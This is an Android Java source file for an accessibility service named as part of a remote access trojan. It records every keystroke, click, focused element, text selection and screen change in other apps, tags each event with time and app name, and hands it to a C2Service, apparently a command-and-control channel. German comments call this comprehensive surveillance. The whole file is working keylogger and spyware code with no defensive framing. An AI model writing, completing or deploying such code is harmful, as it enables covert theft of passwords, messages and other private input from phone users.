package com.example.client;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RATAccessibilityService extends AccessibilityService {

    private static final String TAG = "RATAccessibilityService";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String eventTypeString = AccessibilityEvent.eventTypeToString(event.getEventType());
            JSONObject log = new JSONObject();
            log.put("type", "log");

            JSONObject data = new JSONObject();
            data.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            data.put("event_type", eventTypeString);
            data.put("package_name", event.getPackageName() != null ? event.getPackageName().toString() : "N/A");

            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    String text = event.getText().toString();
                    data.put("content", "Eingegeben: " + text);
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    CharSequence contentDescription = event.getContentDescription();
                    String clickedText = findTextInNode(event.getSource());
                    data.put("content", "Angeklickt: " + (clickedText != null ? clickedText : (contentDescription != null ? contentDescription : "N/A")));
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    data.put("content", "Bildschirm gewechselt zu: " + (event.getText().size() > 0 ? event.getText().get(0) : "N/A"));
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    data.put("content", "Fokussiert: " + findTextInNode(event.getSource()));
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                    data.put("content", "Text ausgewählt: " + event.getText().toString());
                    break;
                default:
                    // Alle Events für umfassende Überwachung loggen
                    data.put("content", "Event: " + eventTypeString);
                    break;
            }

            log.put("data", data);
            C2Service.logEvent(log);

        } catch (JSONException e) {
            Log.e(TAG, "Fehler beim Erstellen des Log-JSON", e);
        }
    }

    private String findTextInNode(AccessibilityNodeInfo nodeInfo) {
        if (nodeInfo == null) return null;
        if (nodeInfo.getText() != null && !nodeInfo.getText().toString().isEmpty()) {
            return nodeInfo.getText().toString();
        }
        for (int i = 0; i < nodeInfo.getChildCount(); i++) {
            String text = findTextInNode(nodeInfo.getChild(i));
            if (text != null) return text;
        }
        return null;
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "onInterrupt");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;

        this.setServiceInfo(info);
        Log.d(TAG, "Accessibility Service verbunden und konfiguriert.");
    }
}
